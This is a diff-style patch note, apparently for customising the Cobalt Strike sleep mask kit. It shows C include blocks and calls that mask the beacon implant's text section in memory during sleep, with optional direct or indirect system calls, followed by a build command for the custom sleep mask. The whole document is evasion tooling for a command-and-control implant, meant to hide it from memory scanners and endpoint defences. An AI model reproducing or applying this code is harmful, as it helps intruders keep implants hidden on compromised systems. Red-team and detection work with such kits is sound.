@@ -1,0 +1,49 @@
+after include “common_mask.c”:
+
+  /* Include the source code for sleep mask capabilities */
+
+  /* MASK_TEXT_SECTION information:
+   *   This determines if the text section of beacon should be masked when sleeping.
+   *   It is recommended to set the stage.userwx profile setting to false.
+   *   This capability will modifying the memory protection and mask/unmask the
+   *   text section of beacon.
+   */
+  #if MASK_TEXT_SECTION
+
+     /* USE_SYSCALLS information:
+    *   USE_SYSCALLS is only used by the MASK_TEXT_SECTION code.
+    *   Determine which system call method should be included.
+    */
+     #if USE_SYSCALLS
+      #ifdef SYSCALLS_embedded
+      #include "syscalls_embedded.c"
+      #endif
+
+      #ifdef SYSCALLS_indirect
+      #include "syscalls_indirect.c"
+      #endif
+
+      #ifdef SYSCALLS_indirect_randomized
+      #include "syscalls_indirect_randomized.c"
+      #endif
+     #endif
+
+     #include "mask_text_section.c"
+  #endif
+
+before mask_sections(parms);:
+  #if MASK_TEXT_SECTION
+     setup_text_section(parms);
+  #endif
+
+after mask_heap(parms);:
+  #if MASK_TEXT_SECTION
+     mask_text_section(parms);
+  #endif
+
+before last mask_heap(parms);:
+  #if MASK_TEXT_SECTION
+     unmask_text_section(parms);
+  #endif
+
+./build.sh 47 WaitForSingleObject true embedded  /mnt/c/Tools/cobaltstrike/custom-sleepmask
